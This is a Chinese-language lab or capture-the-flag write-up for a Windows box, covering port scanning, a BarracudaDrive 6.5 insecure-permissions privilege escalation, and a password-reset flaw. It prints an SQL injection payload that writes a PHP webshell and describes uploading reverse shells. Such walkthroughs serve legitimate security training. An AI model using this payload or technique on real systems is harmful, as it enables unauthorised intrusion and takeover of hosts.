## nmap scanning
- <img width="1918" height="697" alt="image" src="https://github.com/user-attachments/assets/6b9f83f4-0c99-415b-b345-6933e7bd90ff" />
- <img width="1918" height="747" alt="image" src="https://github.com/user-attachments/assets/dcc309ea-6b6a-4ede-80f4-6b97e6451b54" />
- <img width="1918" height="587" alt="image" src="https://github.com/user-attachments/assets/cbcbb7fa-af2d-46ea-a80f-28151545f4f3" />

## 8000 port
- BarracudaDrive server
  - <img width="1918" height="835" alt="image" src="https://github.com/user-attachments/assets/90ddfac2-6fd1-40e0-805e-52c345eb4210" />
- BarracudaDrive 6.5 
  - <img width="1917" height="797" alt="image" src="https://github.com/user-attachments/assets/0c2457ba-0815-4e8d-ac37-86102d61810a" />
- BarracudaDrive v6.5 - Insecure Folder Permissions 可以拿來提權
  - https://www.exploit-db.com/exploits/48789
- 首頁會跳轉到 Set Administrator Account 註冊 admin 帳號
  - <img width="1918" height="827" alt="image" src="https://github.com/user-attachments/assets/3ad0df3c-fbe6-4467-9d05-7c9eee0f2ea4" />
- 註冊完後，點選 web-file-server 發現 /fs/ 目錄
  - <img width="1918" height="795" alt="image" src="https://github.com/user-attachments/assets/9d71a7bc-6ba0-42c4-9dfe-50d4d8d43eb4" />
- /fs/ 底下有 /C 和 /D
  - <img width="1918" height="822" alt="image" src="https://github.com/user-attachments/assets/6f1fbf36-1fff-4eb1-944c-4ebb33fadace" />
- 因為是 admin 權限可以任意上傳檔案和讀檔，可以直接取得 shell 或是直接取得 flag

## 45332 port
- dirsearch 只又 phpinfo,php
  - <img width="1918" height="757" alt="image" src="https://github.com/user-attachments/assets/bf0c15ba-754d-4bee-9d46-ab9f2e48d3b5" />
- phpinfo.php 發現 web 目錄是 C:\xampp\htdocs
  - <img width="1918" height="841" alt="image" src="https://github.com/user-attachments/assets/922e2afa-a746-4531-b237-59f3cfad8149" />

## 33033 port
- 首頁存在 6 個使用者，發現有個貓的頭貼特別奇怪
  - <img width="1918" height="846" alt="image" src="https://github.com/user-attachments/assets/a19a6102-16d2-406f-bb0b-945380899876" />
  - <img width="1918" height="831" alt="image" src="https://github.com/user-attachments/assets/67ea9775-d0ae-4557-a1ce-f7da140c30e4" />
- /login 頁面會一直無法正常顯示登入是否成功
  - <img width="1918" height="817" alt="image" src="https://github.com/user-attachments/assets/ad5b63fc-4e30-4c96-ae61-1879a96852ed" />
- /users/reminder 可以更改密碼，這裡成功更改 jerren.devops:paranoid 的密碼為 password
  - <img width="1918" height="792" alt="image" src="https://github.com/user-attachments/assets/295e4257-669b-4bc1-a30a-1e85c07159ec" />
  - <img width="1918" height="777" alt="image" src="https://github.com/user-attachments/assets/6979d468-c0bf-4c54-ace0-7188301faddb" />
- 成功用新密碼登入 jerren.devops
  - <img width="1918" height="798" alt="image" src="https://github.com/user-attachments/assets/d17d757d-b08a-4d84-85e4-a4322015c8d0" />
- 點選 edit 後，有個連結，訪問它
  - <img width="1918" height="838" alt="image" src="https://github.com/user-attachments/assets/6c3137f2-1d33-429b-829a-7e576ebb6453" />
- 成功寫 webshell 到 C:\xampp\htdocs
  ```
  ' UNION SELECT '<?php system($_GET["cmd"]); ?>' into outfile 'C:\xampp\htdocs\shell.php' -- -
  ```
  - <img width="1918" height="813" alt="image" src="https://github.com/user-attachments/assets/bcb453e7-e3e1-41ae-94d9-afec4aeee0db" />
- 成功執行 web shell
  - <img width="1918" height="647" alt="image" src="https://github.com/user-attachments/assets/a122f667-b24b-48b5-aa3a-004832ce4a62" />
- 上傳 windows-reverse-shell.php，並取得 reverse shell
  - <img width="1918" height="607" alt="image" src="https://github.com/user-attachments/assets/88a41ede-2a50-44a0-8d92-3571d3be129e" />
  - <img width="1918" height="667" alt="image" src="https://github.com/user-attachments/assets/7dece965-9a3e-401b-9d43-aaa955c63d03" />
- 取得 local.txt
  - <img width="967" height="372" alt="image" src="https://github.com/user-attachments/assets/270c7b61-a3dd-4c11-b116-e0c2aecba739" />

## 提權
- BarracudaDrive v6.5 - Insecure Folder Permissions
  - https://www.exploit-db.com/exploits/48789
- 先到 C:\bd\ 將 bd.exe move 成 bd_2.exe
  ```
  move bd.exe bd_2.exe
  ```
  - <img width="1918" height="741" alt="image" src="https://github.com/user-attachments/assets/859786e0-fbc1-4475-85ad-e967ccd376e4" />
  - <img width="852" height="95" alt="image" src="https://github.com/user-attachments/assets/5742d16a-4927-4cde-a2c2-2a226c653e76" />
  - <img width="1918" height="752" alt="image" src="https://github.com/user-attachments/assets/57621753-e66e-4944-9b60-deac169e4570" />
- 上傳 msfvenom 生成的 reverse shell 檔名取為 bd.exe
  - <img width="1918" height="707" alt="image" src="https://github.com/user-attachments/assets/23d9ddcf-f945-41fd-a49c-b7537de76155" />
- 再 shutdown /r 後，成功提權
  - <img width="1417" height="390" alt="image" src="https://github.com/user-attachments/assets/6db9e434-717b-4a90-9c4a-a277e55d208b" />
- 取得 proof.txt
  - <img width="1057" height="472" alt="image" src="https://github.com/user-attachments/assets/de34bb49-d048-453d-abcc-66454699be0f" />

























































